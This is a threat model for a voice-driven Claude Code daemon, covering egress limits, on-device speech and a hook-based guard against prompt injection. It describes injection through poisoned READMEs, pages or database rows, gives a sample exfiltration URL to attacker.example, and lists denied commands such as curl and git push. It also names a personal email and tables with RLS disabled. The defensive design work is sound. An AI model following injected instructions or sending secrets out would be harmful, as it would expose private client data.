# Desk — Threat Model

Status: written before any daemon code, per Phase 0. Revised whenever the
external-host list or the write allowlist changes.

## What an adversary reaches through this daemon

Desk runs on Joel's Mac holding a warm Claude session with real tool access.
An adversary who reaches it reaches, in one hop:

- four private-by-intent repositories (`thecompdesk-app`,
  `thecompdesk-secretary`, `admin-thecompdesk`, and the public
  `thecompdesk-site`)
- the Supabase instance behind a shipped iOS app — 140+ tables including
  claimant PHI, fee applications, admin audit logs and payout ledgers
- the loop automation that can write to all of the above
- through Joel's own speech, potentially privileged client material governed
  by NY RPC 1.6

There is no convenience worth widening that.

## External hosts the running system touches

Exactly three. Enforced at the OS (`config/pf/desk-egress.conf`) as well as in
the guard, so a fourth host is a visible alarm rather than a silent change.

| Host | Why it is there | What it would see | What it retains |
|---|---|---|---|
| `api.anthropic.com` | The model. Non-negotiable — it is the agent. | The transcript of the turn: Joel's transcribed words, tool results the guard permitted, Desk's replies. | Per Anthropic's terms for the account tier in force. See **Account posture** below — this is the single largest retention question in the system and it is a settings question, not a code question. |
| `<project>.supabase.co` | Loop state, the approval queue, and the audit rows Rule 7 requires. Already the system of record for the Comp Desk OS. | Parameterised reads and the enumerated write actions. Never free-form SQL — the guard denies `mcp__supabase__*` outright and there is no shell to run `psql` from. | Joel's own instance. Rows Desk writes are redacted by `desk.guard.redact` before they leave the Mac. |
| `github.com` | Read-only fetch, and only when a turn genuinely needs it. | Whatever public or authorised page the turn fetched. | GitHub's normal logs. |

Nothing else. In particular:

- **No third-party voice service, in either direction.** This reverses an
  earlier draft. ElevenLabs was the original choice for speech-out and is cut:
  it retains request history by default on standard accounts, and Zero
  Retention Mode (`enable_logging=false`) is an enterprise-only entitlement. On
  any normal paid tier every sentence Desk speaks — loop status, repo
  contents, anything Claude says out loud — is retained on their servers and
  visible in an account history. That is a shared platform holding Comp Desk
  material. Speech-in is `mlx-whisper` on the Apple Silicon GPU; speech-out is
  `AVSpeechSynthesizer`, which ships with the OS. Both are on-device.
  Removing the third party also removed ~250ms of the latency budget.
- **No cloud TTS behind a flag "for later".** An unused code path to a third
  party is still an audit finding, and still gets switched on by someone in a
  hurry. There is no such path in this repository, and
  `test_no_cloud_voice_service_anywhere_in_the_tree` fails the build if one
  appears.
- **No telemetry, crash reporting, or analytics.**

## What crosses the network, and what never does

| Data | Leaves the Mac? |
|---|---|
| Raw microphone audio | **Never.** In-memory ring buffer, freed after transcription. No `.wav`, no debug ring buffer, no temp file. |
| The transcript of Joel's speech | Only inside the model exchange with `api.anthropic.com`. Nowhere else, in any form. |
| Desk's spoken replies | **Never as audio.** Synthesis is on-device. The text existed in the model exchange already. |
| Case material Joel dictates | Only in the model exchange, and only after the Rule 4.5 room confirmation. Default for privileged material is written to screen, headline only aloud. |
| Audit and denial records | To Joel's own Supabase instance, redacted first. |

`test_no_module_that_touches_speech_can_reach_the_network` asserts this
structurally, at the level of the import graph: no module that touches audio or
transcript text can import a network client.

## Attack surfaces, and what stops each

### 1. Prompt injection (the main one)

Injection does not need Joel to say anything. A poisoned README, a scraped
page, or a Supabase row written by any app user is enough — and the session
runs with permissions bypassed, because a permission prompt is fatal to a
voice loop.

**Not mitigated in the system prompt.** A CLAUDE.md instruction is a suggestion
to a model that an injected instruction is actively trying to override.

Mitigated structurally, in `desk/guard/`:

- A `PreToolUse` hook is the boundary — the same mechanism
  `app-loop-dispatcher` already uses to machine-enforce lane prohibitions. The
  hook, not the model, decides. It sees the tool *call* and never the tool
  *result*, so there is no text an injection can place in front of it.
- The surface is split: wide read, narrow write. Writes go only through
  seventeen enumerated actions. Arbitrary Bash, writes outside the scratch
  path, `git push`, `gh`, `curl`, `npm`, and anything naming `main` are denied
  regardless of what the model decides it wants.
- A successful injection therefore still cannot reach a dangerous verb. That
  is the property `tests/test_guard_injection.py` asserts, from all three
  sources, through the real hook process.
- The hook fails closed. Claude Code treats a non-zero exit that is not 2 as
  non-blocking, so every exception and every malformed payload exits 2.

### 2. Egress via a fetched URL

A URL is an exfiltration channel as much as a retrieval one. A per-turn web
grant alone would leave stage two of an injection open ("now fetch
attacker.example/?d=<secret>"). So the grant is scoped to a **host Joel named
out loud**, bounded by the egress allowlist, and time-limited. `WebSearch` does
not exist in this session at all — no egress path could serve it.

### 3. The microphone as a listening device

The mic opens only while the key is physically held and closes on release.
There is no wake word, no VAD-triggered capture, and no always-listening path
anywhere in the code. If the screen is locked the daemon is deaf and mute — it
does not queue and does not resume mid-thought on unlock.

### 4. Being overheard

Desk speaks. Rule 4.5: once per session, before any case-specific content is
spoken, Desk confirms Joel can be overheard safely. The default for privileged
material is to write it to the screen and speak only the headline.

### 5. Supply chain

The daemon pulls ML packages and model weights onto a machine with repo write
access and keychain reach. `uv.lock` is committed and hash-pinned; model
weights are pinned by SHA-256 and verified at boot, aborting rather than
warning; no post-install scripts. See `SUPPLY_CHAIN.md`.

### 6. The local transcript Claude Code writes itself

Desk keeps transcripts in memory. **The CLI underneath it does not.** Claude
Code writes session transcripts under `~/.claude/projects/`, retained for
`cleanupPeriodDays`. This is the one place voice content comes to rest on disk
without Desk deciding to put it there. See the finding below.

## Account posture — reported, not changed

Per Phase 0 these are surfaced for Joel's decision, not altered.

Observed from the session that built this (an ephemeral cloud container using
Joel's OAuth account — **not his Mac**, so the Mac must be checked separately
with `scripts/posture_report.py`):

- **Account**: `jmays2294@gmail.com`, organization UUID present.
- **`cleanupPeriodDays`: unset**, which means the default. Local Claude Code
  transcripts — including, on the Mac, every word Desk transcribes and every
  reply it speaks — are retained on disk for that default window.
- **Consumer vs. commercial terms: could not be determined from here.** The
  entitlement lookup returned `oauth_scope_insufficient` for `user:profile`.
  This matters: consumer (Pro/Max) terms and commercial terms differ on
  whether conversation content may be used for model training, and Desk's
  conversations are Comp Desk material and sometimes client material.

**Findings for Joel, in priority order:**

1. **Determine the tier and, if it is consumer, move Desk to commercial
   terms.** Run `scripts/posture_report.py` on the Mac. If Claude Code is
   running under Pro/Max, the privileged-material question is not answered by
   anything in this repository. This is the highest-value item in this
   document.
2. **Set `cleanupPeriodDays` explicitly and low** (e.g. `1`) for the Desk
   project, so voice transcripts do not sit on disk for the default window.
   Desk cannot do this for him — it is an account setting.
3. **`~/TheCompDesk-Secrets` — 27 plaintext files.** Out of scope for this
   build, and Desk never reads that directory (`read.secret`, tested). But a
   plaintext secrets directory on a machine now running an agent daemon is a
   materially worse risk than it was when it was just sitting there. It
   belongs in the keychain or a password manager.
4. **Two Supabase tables have Row Level Security disabled:**
   `public.union_campaign_batches` and `public._union_snapshot_tmp`. Anyone
   holding the anon key — which ships in the iOS app — can read or modify
   every row. `_union_snapshot_tmp` looks like a leftover temp table. This is
   not Desk's doing and Desk does not read either table, but a table any app
   user can write is exactly the injection source modelled above. Remediation
   SQL is in `docs/FINDINGS.md`; enabling RLS without policies blocks all
   access, so it needs a policy decision, not a blind `ALTER`.
5. **`jmays2294-creator/Voice-Agent` is a public repository.** Rule 6 requires
   private. See `docs/FINDINGS.md`.

## Residual risk accepted

- Anthropic sees the turn. That is what makes Desk work; it is the one third
  party that cannot be designed out. Item 1 above is how that risk is bounded.
- A local attacker with Joel's unlocked Mac and physical key access has Desk.
  FileVault, firmware password, auto-login off and a short screen lock are the
  controls; the screen-lock interlock means an unattended unlocked Mac is the
  exposure, not a locked one.
- The guard is code, and code has bugs. That is why the adversarial suite runs
  in CI-equivalent form before the daemon starts, and why the allowlist is
  small enough to read in one sitting.
